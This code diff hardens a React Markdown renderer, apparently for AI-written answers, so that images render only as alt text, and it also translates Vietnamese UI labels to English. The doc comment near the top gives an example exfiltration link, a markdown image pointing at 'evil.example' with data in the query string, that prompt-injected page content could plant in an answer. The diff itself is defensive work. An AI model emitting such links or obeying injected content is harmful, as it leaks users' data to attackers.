@@ -28,6 +28,11 @@ import { MarkdownCopyButton } from "./markdown-copy-button"
  * the one plugin that adds elements adds `span`s it writes itself around text it
  * never reads as markup.
  *
+ * **No image loads.** An answer can be written out of a page an attacker
+ * controls, and `![](https://evil.example/?d=…)` in it would have the reader's
+ * browser send that URL — and whatever the injection packed into it — the
+ * moment it rendered. So an image is drawn as its alt text and nothing else.
+ *
  * **No autolinked bare URL becomes a live anchor without a rel.** Every link
  * goes through the component below, which opens in a new tab and sends no
  * referrer — the prose can be written out of untrusted external pages, and a
@@ -99,6 +104,7 @@ export const Markdown = memo(function Markdown({
         rehypePlugins={rehypePlugins}
         components={{
           a: Anchor,
+          img: ImageAsText,
           pre: CodeBlock,
           table: Table,
           th: TableHeader,
@@ -122,6 +128,12 @@ type TableHeaderProps = WithNode<ComponentPropsWithoutRef<"th">>
 type TableCellProps = WithNode<ComponentPropsWithoutRef<"td">>
 type PreProps = WithNode<ComponentPropsWithoutRef<"pre">>
 type AnchorProps = WithNode<ComponentPropsWithoutRef<"a">>
+type ImageProps = WithNode<ComponentPropsWithoutRef<"img">>
+
+/** An image in the prose, as the words it stands for. Never a request. */
+function ImageAsText({ alt }: ImageProps) {
+  return alt ? <>{alt}</> : null
+}
 
 function TableHeader({ node: _node, align, style, ...props }: TableHeaderProps) {
   return (
@@ -186,7 +198,7 @@ function Table({ node: _node, ...props }: TableProps) {
     <div className="relative">
       <div
         role="region"
-        aria-label="Bảng trong câu trả lời"
+        aria-label="Table in the answer"
         tabIndex={0}
         className="overflow-x-auto overscroll-x-contain focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
       >
@@ -198,8 +210,8 @@ function Table({ node: _node, ...props }: TableProps) {
       </div>
       <MarkdownCopyButton
         getText={tableText}
-        label="Sao chép bảng"
-        copiedLabel="Đã sao chép bảng"
+        label="Copy table"
+        copiedLabel="Table copied"
         className="absolute right-0 top-0 bg-background sm:bg-transparent"
       />
     </div>
@@ -216,7 +228,7 @@ function CodeBlock({ node: _node, className, ...props }: PreProps) {
         {...props}
         ref={preRef}
         tabIndex={0}
-        aria-label="Khối mã"
+        aria-label="Code block"
         className={cn(
           "overflow-x-auto px-4 py-4 pr-14 font-mono text-row leading-6 text-ink-1",
           "[font-variant-numeric:tabular-nums] focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-inset focus-visible:ring-ring",
@@ -225,8 +237,8 @@ function CodeBlock({ node: _node, className, ...props }: PreProps) {
       />
       <MarkdownCopyButton
         getText={() => preRef.current?.textContent?.replace(/\n$/, "") ?? ""}
-        label="Sao chép khối mã"
-        copiedLabel="Đã sao chép khối mã"
+        label="Copy code block"
+        copiedLabel="Code block copied"
         className="absolute right-0 top-0"
       />
     </div>
